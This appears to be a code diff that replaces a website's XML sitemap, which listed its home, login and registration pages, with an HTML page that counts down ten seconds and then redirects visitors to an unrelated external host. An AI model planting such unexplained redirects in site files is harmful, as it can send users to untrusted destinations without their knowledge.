@@ -1,27 +1,22 @@
-<?xml version="1.0" encoding="UTF-8"?>
-<urlset
-      xmlns="http://www.sitemaps.org/schemas/sitemap/0.9"
-      xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
-      xsi:schemaLocation="http://www.sitemaps.org/schemas/sitemap/0.9
-            http://www.sitemaps.org/schemas/sitemap/0.9/sitemap.xsd">
-<!-- created with Free Online Sitemap Generator www.xml-sitemaps.com -->
+<!DOCTYPE html>
+<html>
+<body>
+  <h2 id="countdown"></h2>
 
+  <script>
+    var seconds = 10;
 
-<url>
-  <loc>https://dns.xg666.site/</loc>
-  <lastmod>2023-12-05T11:19:34+00:00</lastmod>
-  <priority>1.00</priority>
-</url>
-<url>
-  <loc>https://dns.xg666.site/login</loc>
-  <lastmod>2023-12-05T11:19:34+00:00</lastmod>
-  <priority>0.80</priority>
-</url>
-<url>
-  <loc>https://dns.xg666.site/login?act=reg</loc>
-  <lastmod>2023-12-05T11:19:34+00:00</lastmod>
-  <priority>0.80</priority>
-</url>
+    function countdown() {
+      if (seconds == 0) {
+        window.location.href = "http://wep.lk.weie.eu.org/inde.htm"; // 请将"目标网址"替换为你想要跳转的网址
+      } else {
+        document.getElementById("countdown").innerHTML = seconds + " 秒后自动跳转...";
+        seconds--;
+        setTimeout(countdown, 1000);
+      }
+    }
 
-
-</urlset>
+    countdown();
+  </script>
+</body>
+</html>
